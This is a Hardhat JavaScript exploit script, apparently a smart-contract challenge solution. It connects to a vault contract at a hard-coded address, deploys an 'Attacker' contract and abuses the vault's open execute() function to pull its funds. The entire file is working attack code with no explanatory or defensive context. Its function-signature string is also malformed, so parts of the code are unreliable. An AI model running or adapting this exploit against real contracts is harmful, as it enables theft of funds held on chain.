const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();
    console.log("## ATTACK ACCOUNT: ", attacker.address);

    const contractAddress = "0xBBCf8b480F974Fa45ADc09F102496eDC38cb3a6C";

    //Get the contract
    const contractABI = [
        {"inputs":[{"internalType":"address","name":"_imp","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
        {"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"oldDelegate","type":"address"},{"indexed":false,"internalType":"address","name":"newDelegate","type":"address"}],"name":"DelegateUpdated","type":"event"},
        {"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"_from","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Deposit","type":"event"},
        {"stateMutability":"payable","type":"fallback"},
        {"inputs":[],"name":"delegate","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"_target","type":"address"},{"internalType":"bytes","name":"payload","type":"bytes"}],"name":"execute","outputs":[{"internalType":"bytes","name":"","type":"bytes"}],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"newDelegateAddress","type":"address"}],"name":"upgradeDelegate","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"stateMutability":"payable","type":"receive"}
    ];

    const vaultContract = new ethers.Contract(contractAddress, contractABI, attacker);

    const contractBalance = await ethers.provider.getBalance(vaultContract.address);
    console.log(`## CONTRACT BALANCE: ${ethers.utils.formatEther(contractBalance)}`);

    //Deploy attacker
    const attackerFactory = await ethers.getContractFactory("Attacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();
    
    console.log("## ATTACKER CONTRACT DEPLOYED TO: ", attackerContract.address);

    let attackerContractFunctionABI = [`function receiveFunds(){value: ${ethers.utils.parseEther("0.2")}}`];
    let interface = new ethers.utils.Interface(attackerContractFunctionABI);
    let encodedData = interface.encodeFunctionData("receiveFunds");

    await vaultContract.execute(attackerContract.address, encodedData);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });